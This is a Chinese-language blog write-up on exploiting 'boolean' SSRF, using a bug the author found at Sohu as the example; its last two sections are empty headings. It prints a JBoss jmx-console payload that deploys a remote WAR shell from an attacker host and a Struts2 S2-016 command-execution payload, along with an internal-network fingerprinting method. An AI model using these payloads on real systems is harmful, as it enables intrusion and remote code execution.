### Bool型SSRF的思考与实践

	0x00 Bool型SSRF 
	0x01 SSRF利用的基本思路
	0x02 两者之间的区别
	0x03 Bool型SSRF利用方法
	0x04 Struts2在Bool型SSRF中的利用
	0x05 Other(想到什么写什么)

#### 0x00 Bool型SSRF
什么是Bool型SSRF, 没听说过. 其实我也没有听说过. 只是我也不知道该怎么描述就起了这样一个名称.

Bool型SSRF: 简单来说就是仅返回True 或 False的SSRF. 就以我前两天我挖掘的一个搜狐SSRF为例, 只有服务器端正确响应HTTP请求并且只有响应码为200的时候, 返回Success，其余全部返回Failed. 这就是一个典型的Bool型SSRF.

#### 0x01 SSRF利用的基本思路
Wooyun上有很多SSRF典型的案例, 可以说让人拍案惊奇. 但是没有一个关于BOOL型SSRF的利用案例(可能我没看到吧). 这次挖掘到一个搜狐的Bool型SSRF, 对于我这个只是简单理解SSRF原理没有任何实战的渣渣来说, 难度还真大. 不过想想, 以前没有接触过SSRF, 这次就把你玩透. 翻阅学习Wooyun上的案例, 了解SSRF利用的基本思路:

	内网探测 -> 应用识别 -> 攻击Payload -> Payload Result

1. 内网探测: 内网主机信息收集
2. 应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)
3. 攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)
4. Payload Result: 返回相应Payload的执行信息

#### 0x02 两者之间的区别
BOOL型SSRF与一般的SSRF的区别在步骤二应用识别, 步骤三攻击Payload和步骤四Payload Result. 一般的SSRF在应用识别阶段返回的信息相对较多, 比如Banner信息, HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回, 而Bool型SSRF的却永远只有True or False. 因为没有任何Response信息, 所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload. 在此次搜狐SSRF的中, 我分别使用了JBOSS远程调用和Struts2 S2-016远程命令执行. 对于Bool型SSRF, 我们不能说Payload打过去就一定成功执行, 就算是返回True, 也不能保证Payload一定执行成功. 所以我们要验证Payload的执行状态信息.

#### 0x03 Bool型SSRF利用方法
**应用识别**

	{ 指纹1 + 指纹2 + 黑指纹 }

以JBOSS为例: { /jmx-console/ + /invoker/JMXInvokerServlet + /d2z341.d#211 }

指纹1 和 指纹2 为应用识别指纹, 准确率越高越好. 黑指纹其实就是不会匹配任何应用的指纹，一般用较长的字符串代替即可. 分别用指纹1, 指纹2 和 黑指纹对内网主机探测统计, 获取三个主机列表: jmx-console.host(A)    invoker.host(B)    black.host(C). 

Host = (A∩B) –(A∩B∩C) 即剔除jmx-console.host 和 invoker.host中存在于black.host的主机, 然后对jmx-console和invoker.host的主机取交集.

**攻击Payload**

针对不用的应用我们需要加载不同的Payload, 但是大多数的攻击都是需要和Payload Result进行交互的. 这类Payload是没有办法用在此处的, 我们需要的是不需要和Payload Result进行交互的Payload. 我可以想到的两种应用比较广泛的Payload有JBOSS和Struts2漏洞.

JBoss Payload:

`/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system%3Aservice%3DMainDeployer&methodIndex=3&arg0=http%3A%2F%2F192.168.1.2%2Fzecmd.war`

通过JBOSS HtmlAdaptor接口直接部署远程war包, 我们可以通过access.log去验证war包是否成功部署.下面就是通过SSRF去执行不同的命令.还有一种方式,就是我们可以通过我们服务器的access.log日志获取到远程服务器对应的公网IP, 有时也会有一些意外惊喜.

Struts2 Payload:

`/action?action:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}`

Struts2漏洞的影响大家都懂的, 通过URL直接远程命令执行, 想打那里就打那里.

**Payload Result**

获取Payload Result是十分有必要的, 这里的Payload Result和非Bool型SSRF的Result不是一个意思. 对于Bool型SSRF, 服务器端返回的数据永远只有True和False, 我们是可以通过返回的True或者False来判断Payload的执行状态, 但是这样的判断标准是无法让人信服的. 能否有一种方法能够精确的判断Payload的执行状态,而且能够返回Payload Result. 对于Struts2我找到了一种可利用的方法.

#### 0x04 Struts2在Bool型SSRF中的利用

#### 0x05 Other(想到什么写什么)
